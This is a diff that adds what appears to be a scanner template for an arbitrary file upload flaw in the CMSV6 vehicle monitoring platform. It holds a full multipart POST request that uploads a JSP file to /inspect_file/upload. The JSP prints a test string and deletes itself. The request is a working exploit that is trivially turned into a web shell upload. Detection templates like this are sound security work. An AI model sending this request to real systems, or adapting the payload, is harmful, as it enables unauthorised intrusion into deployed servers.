@@ -1,0 +1,26 @@
+id:
+
+info:
+  name: 通天星CMSV6车载定位监控平台任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /inspect_file/upload
+  headers:
+    Accept: "*/*"
+    Content-Type: multipart/form-data;boundary=-----------------------------7db372eb000e2
+  data: |
+    -----------------------------7db372eb000e2
+    Content-Disposition: form-data; name="uploadFile"; filename="1.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("hello,test");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    -----------------------------7db372eb000e2--
+response1:
+  body: OK
+  code: 200
+requests2:
+response2:
